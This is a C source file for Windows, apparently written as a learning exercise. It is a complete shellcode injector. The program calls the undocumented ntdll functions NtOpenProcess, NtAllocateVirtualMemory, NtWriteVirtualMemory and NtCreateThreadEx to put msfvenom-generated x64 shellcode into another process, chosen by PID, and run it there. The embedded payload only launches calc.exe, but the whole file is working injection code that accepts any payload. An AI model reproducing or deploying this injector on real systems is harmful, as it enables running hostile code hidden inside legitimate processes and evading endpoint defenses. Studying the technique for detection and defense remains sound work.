#include <windows.h>
#include <stdio.h>

#pragma comment (lib, "ntdll")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

/* learning some runtime string obfuscation (very-very minimal, matter in fact, this probably shouldn't even be in here, but i'm learning so... oh well) */
char e[4] = "(-)";
char k[4] = "(+)";
char i[4] = "(*)";

/* 

                                   full shellcode injection with NTDLL:

NtOpenProcess() ---                                                                   --- NtCreateThreadEx()
				  |                                                                   | 
				  |                                                                   |
				  |                                                                   |
				  |----> NtAllocateVirtualMemory() ----> NtWriteVirtualMemory() ----> | 

*/

/* define some necessary kernel structures for us to use with NTAPI/NTDLL */

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG              Length;
    HANDLE             RootDirectory;
    PUNICODE_STRING    ObjectName;
    ULONG              Attributes;
    PVOID              SecurityDescriptor;
    PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    PVOID              UniqueProcess;
    PVOID              UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

/* create function prototypes for NT API */

typedef NTSTATUS(NTAPI* pNtOpenProcess) (
    PHANDLE              ProcessHandle,
    ACCESS_MASK          AccessMask,
    POBJECT_ATTRIBUTES   ObjectAttributes,
    PCLIENT_ID           ClientID
	);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID*		         BaseAddress,
	ULONG                ZeroBits,
	PULONG				 RegionSize,
	ULONG                AllocationType,
	ULONG                Protect
	);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
	HANDLE               ProcessHandle,
	PVOID                BaseAddress,
	PVOID                Buffer,
	ULONG                NumberOfBytesToWrite,
	PULONG               NumberOfBytesWritten 
	);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	PHANDLE				hThread,
	ACCESS_MASK			DesiredAccess,
	PVOID				ObjectAttributes,
	HANDLE				ProcessHandle,
	PVOID				lpStartAddress,
	PVOID				lpParameter,
	ULONG				Flags,
	SIZE_T				StackZeroBits,
	SIZE_T				SizeOfStackCommit,
	SIZE_T				SizeOfStackReserve,
	PVOID				lpBytesBuffer
	);

NTSTATUS status;
PVOID rBuffer = NULL;
HMODULE hNTDLL = NULL;
HANDLE hProcess, hThread = NULL;


// msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/exec CMD="cmd.exe /c calc.exe" -f c --var-name=shellcode
unsigned char shell[] =
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
	"\x6c\x63\x2e\x65\x78\x65\x00";

size_t shellSize = sizeof(shell);

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("%s usage: FULLNTDLL.exe <pid>", e);
		return EXIT_FAILURE;
	}

	/* initialize the _CLIENT_ID & _OBJECT_ATTRIBUTES kernel structures */
	DWORD PID = atoi(argv[1]);
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	printf("%s process ID: (%llu)\n", i, (unsigned long long)CID.UniqueProcess);

	/* get a handle to NTDLL */
	hNTDLL = GetModuleHandleW(L"ntdll");

	if (!hNTDLL) {
		printf("%s failed to get handle to NTDLL, error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got handle to NTDLL (0x%p)\n", k, hNTDLL);

	/* create NTAPI functions from prototypes + populate them with their respective addresses from NTDLL */
	pNtOpenProcess OPEN = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	pNtAllocateVirtualMemory ALLOC = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	pNtWriteVirtualMemory WRITE = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	pNtCreateThreadEx THREAD = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");

	printf("%s created function OPEN:  \n\t \\---0x%p [ntdll!NtOpenProcess]\n", k, &OPEN);
	printf("%s created function ALLOC: \n\t \\---0x%p [ntdll!NtAllocateVirtualMemory]\n", k, &ALLOC);
	printf("%s created function WRITE: \n\t \\---0x%p [ntdll!NtWriteVirtualMemory]\n", k, &WRITE);
	printf("%s created function OPEN:  \n\t \\---0x%p [ntdll!NtCreateThreadEx]\n", k, &THREAD);

	/* begin injection */
	status = OPEN(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);

	/* if the PID doesn't exist, it gets returned as (0), setup some error handling*/
	if (status != STATUS_SUCCESS) {
		printf("%s failed to get handle to process (%llu), you sure the process exists?\n", e, (unsigned long long)CID.UniqueProcess);
		return EXIT_FAILURE;
	}

	printf("%s got handle to process (%ld): \n\t \\---0x%p\n", k, GetProcessId(hProcess), &hProcess);

	status = ALLOC(hProcess, &rBuffer, FALSE, (PULONG)&shellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* horrible permissions but :kek: */

	printf("%s allocated %zu-bytes in the process memory\n", i, sizeof(shell));

	status = WRITE(hProcess, rBuffer, shell, sizeof(shell), NULL);

	printf("%s wrote %zu-bytes in the process memory\n", k, sizeof(shell));

	status = THREAD(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);

	if (!hThread || hThread == NULL) {
		printf("%s couldn't create handle to thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s created remote thread in target process!\n", k);
	printf("%s waiting for thread to complete execution\n", i);

	WaitForSingleObject(hThread, INFINITE);

	printf("%s thread finished execution\n", k);
	printf("%s closing handle to process and handle\n", i);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	printf("%s handle to thread closed\n", i);
	printf("%s handle to process closed\n", i);
	printf("%s finished! enjoy!", k);

	return EXIT_SUCCESS;
}